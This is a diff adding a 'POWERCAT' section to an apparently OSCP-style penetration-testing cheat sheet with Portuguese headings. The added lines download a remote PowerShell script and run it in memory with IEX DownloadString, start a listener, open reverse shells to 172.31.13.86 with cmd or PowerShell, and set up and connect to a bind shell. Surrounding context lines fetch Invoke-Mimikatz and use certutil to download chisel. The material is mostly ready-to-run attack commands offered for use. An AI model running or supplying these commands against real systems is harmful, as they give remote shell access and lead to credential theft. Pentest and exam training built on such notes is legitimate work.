@@ -1448,6 +1448,35 @@ curl https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps
 certutil -urlcache -split -f http://10.11.7.210/chisel_1.7.7_windows_amd64
 ```
 
+## POWERCAT
+##### POWERCAT - DOWNLOAD
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1  -Outfile powercat.ps1
+import-module .\powercat.ps1
+```
+##### POWERCAT - AGUARDAR CONEXÃO
+```
+powercat -l -p 666 -v
+```
+##### POWERCAT - SHELL REVERSO
+```
+powercat -c 172.31.13.86 -p 666 -e cmd
+powercat -c 172.31.13.86 -p 666 -ep
+```
+##### POWERCAT - BINDSHELL
+```
+powercat -l -p 8000 -ep -rep
+```
+##### POWERCAT - CONECTAR NO BINDSHELL
+```
+powercat -c 172.31.8.201 -p 8000
+```
+
+
+
 ## MSFVENOM
 ##### REVERSE SHELL - LINUX x64
 ```
